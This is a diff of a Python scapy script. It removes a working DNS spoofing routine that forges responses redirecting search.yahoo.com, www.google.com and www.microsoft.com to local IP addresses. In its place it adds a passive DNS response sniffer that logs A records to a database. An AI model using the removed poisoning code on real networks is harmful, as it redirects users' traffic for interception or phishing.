@@ -1,86 +1,29 @@
-from scapy.all import *
+import os
+import time, threading
+
+from scapy.all import sniff
+from scapy.layers.inet import *
+
+from dnslogsDao import DnsLogsDao
 
 
+def pack_callback(packet):
+    print(packet.show())
+    if packet[UDP].payload:
+        if (packet.sprintf("%DNS.qr%") == "1"):
+            # print(packet[UDP].show())
+            # packet['DNSRR'].show()
+            print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
+            for i in range(1,packet['DNS'].ancount+1):
+                domain_str = packet['DNSRR'][0].rrname
+                ipaddr_str = packet['DNSRR'][i-1].rdata
+                print("[No.%d] response: Qname: %s    Rdata: %s" % (i, domain_str, ipaddr_str))
+                if packet['DNSRR'][i-1].type==1:
+                    DnsLogSDaoThread = threading.Thread(target=DBTest.insertData, name="DnsLogSDaoThread")
+                    DnsLogSDaoThread.start()
+            print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
 
-# redirect domain to the special ip
-posion_table = {'search.yahoo.com': '192.168.1.107',
-                'www.google.com': '192.168.1.108',
-                'www.microsoft.com': '192.168.1.109'}
-
-
-def dns_posion(pkt):
-
-    if pkt and pkt.haslayer('UDP') and pkt.haslayer('DNS'):
-        ip = pkt['IP']
-        udp = pkt['UDP']
-        dns = pkt['DNS']
-
-        # dns query packet
-        if int(udp.dport) == 53:
-            qname = dns.qd.qname
-            domain = qname[:-1]
-
-            print ("\n[*] request: %s:%d -> %s:%d : %s" % (
-                ip.src, udp.sport, ip.dst, udp.dport, qname))
-
-            # match posion domain (demo, maybe not explicit)
-            if domain.lower() in (posion_table.keys()):
-
-                posion_ip = posion_table[domain]
-
-                # send a response packet to (dns request src host)
-                pkt_ip = IP(src=ip.dst,
-                            dst=ip.src)
-
-                pkt_udp = UDP(sport=udp.dport, dport=udp.sport)
-
-                # if id is 0 (default value) ;; Warning: ID mismatch
-                pkt_dns = DNS(id=dns.id,
-                              qr=1,
-                              qd=dns.qd,
-                              an=DNSRR(rrname=qname, rdata=posion_ip))
-
-                print ("[*] response: %s:%s <- %s:%d : %s - %s" % (
-                    pkt_ip.dst, pkt_udp.dport,
-                    pkt_ip.src, pkt_udp.sport,
-                    pkt_dns['DNS'].an.rrname,
-                    pkt_dns['DNS'].an.rdata))
-
-                send(pkt_ip/pkt_udp/pkt_dns)
-
-
-def dns_sniff(pkt):
-    """ parse dns request / response packet """
-    if pkt and pkt.haslayer('UDP') and pkt.haslayer('DNS'):
-        ip = pkt['IP']
-        udp = pkt['UDP']
-        dns = pkt['DNS']
-
-        # dns query packet
-        if int(udp.dport) == 53:
-            qname = dns.qd.qname
-
-            print ("\n[*] request: %s:%d -> %s:%d : %s" % (
-                ip.src, udp.sport, ip.dst, udp.dport, qname))
-
-        # dns reply packet
-        elif int(udp.sport) == 53:
-            # dns DNSRR count (answer count)
-            for i in range(dns.ancount):
-                dnsrr = dns.an[i]
-                print ("[*] response: %s:%s <- %s:%d : %s - %s" % (
-                    ip.dst, udp.dport,
-                    ip.src, udp.sport,
-                    dnsrr.rrname, dnsrr.rdata))
-
-
-def main():
-    # capture dns request and response
-    # sniff(filter="udp port 53", prn=dns_sniff)
-
-    # dns poisin (redirect domain to a special ip)
-    sniff(filter="udp port 53", prn=dns_posion)
-
-
-if __name__ == "__main__":
-    main()
+# sniff()第一个参数可以筛选协议类型及端口号，第二个参数设置监听的网卡名
+iface = os.getenv("IFACE", "Realtek PCIe GbE Family Controller")
+DBTest = DnsLogsDao()
+dnsSniffPacket = sniff(filter="udp port 53", iface=iface, prn=pack_callback, count=0)
